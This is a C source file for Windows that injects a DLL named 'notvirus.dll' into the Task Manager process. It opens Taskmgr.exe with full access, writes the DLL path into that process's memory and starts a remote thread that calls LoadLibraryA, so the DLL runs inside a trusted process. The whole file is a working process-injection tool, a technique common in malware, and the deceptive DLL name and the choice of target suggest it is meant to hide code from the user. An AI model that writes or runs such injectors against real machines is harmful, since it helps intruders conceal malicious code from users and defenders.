#include "injector.h"

int main() {

    char * process = "Taskmgr.exe";
    DWORD proc_id = get_proc_id(process);
    if (!proc_id) {
        printf("Error in getting process ID\n");
        return -1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc_id);
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        printf("Invalid handle value\n");
        return -1;
    }


    char * dll = ".\\notvirus.dll";
    int length = (int)strlen(dll) + 1;
    LPVOID memory_loc = VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!memory_loc) {
        printf("Could not write memory location\n");
        return -1;
    }

    if (!WriteProcessMemory(hProcess, memory_loc, dll, length, NULL)) {
        printf("Failed to write process memory\n");
        return -1;
    }

    // Get the real address of LoadLibraryW in Kernel32.dll
    PTHREAD_START_ROUTINE loadLibraryFunction = (PTHREAD_START_ROUTINE) (
            GetProcAddress(GetModuleHandleW(L"Kernel32"), "LoadLibraryA"));


    // Create remote thread that calls LoadLibraryW
    HANDLE remoteThreadHandle = CreateRemoteThread(hProcess,
                                                   NULL, 0, loadLibraryFunction, memory_loc, 0, NULL);
    if (!remoteThreadHandle) {
        printf("Failed to get a remote thread\n");
        return -1;
    }


    printf("This is process ID: %lu\n", proc_id);
    return 0;
}

